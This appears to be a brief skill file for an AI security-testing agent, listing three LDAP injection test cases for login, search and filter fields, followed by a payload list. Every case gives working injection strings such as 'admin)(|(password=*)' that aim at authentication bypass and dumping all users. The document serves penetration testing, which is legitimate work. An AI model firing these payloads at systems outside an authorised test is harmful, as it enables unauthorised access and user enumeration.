# LDAP Injection Hunting Skill — 3 Test Cases

> Load when: LDAP, Active Directory, directory service.

## 259. Basic LDAP injection (easy)
In login fields, send: `admin)(|(password=*)`, `*`, `admin)(!(password=*`))`. Report if auth bypass occurs.

## 260. LDAP search injection (easy)
In search fields, send: `*)(uid=*))(|(uid=*`. Report if all users are returned.

## 261. LDAP filter injection (medium)
If LDAP filter is constructed from user input, inject: `)(cn=*))(|(cn=*`. Report filter manipulation.

---

## LDAP Injection Payloads
```
admin)(|(password=*)
*)(uid=*))(|(uid=*
*)(objectClass=*)
admin)(!(password=*))
```
